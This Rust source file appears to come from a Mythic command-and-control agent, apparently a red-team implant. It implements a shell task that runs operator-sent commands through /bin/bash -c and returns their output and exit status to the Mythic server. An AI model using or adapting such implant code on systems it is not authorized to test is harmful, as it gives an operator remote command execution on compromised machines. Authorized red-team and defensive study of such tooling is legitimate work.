use crate::agent::AgentTask;
use crate::mythic_success;
use serde::Deserialize;
use std::error::Error;
use std::process::Command;
use std::sync::mpsc;

#[derive(Deserialize)]
struct ShellArgs {
    command: String,
}

/// Runs a specified shell command in the same thread
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
pub fn run_cmd(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ShellArgs = serde_json::from_str(&task.parameters)?;

    let shell_cmd = Command::new("/bin/bash")
        .arg("-c")
        .arg(&args.command)
        .output()?;

    let output = match shell_cmd.status.code() {
        Some(code) => {
            format!(
                "Command status: {}\n\nStdout:\n{}\nStderr:\n{}",
                code,
                std::str::from_utf8(&shell_cmd.stdout)?,
                std::str::from_utf8(&shell_cmd.stderr)?
            )
        }
        None => "Command was killed by signal.".to_string(),
    };

    tx.send(mythic_success!(task.id, output))?;
    Ok(())
}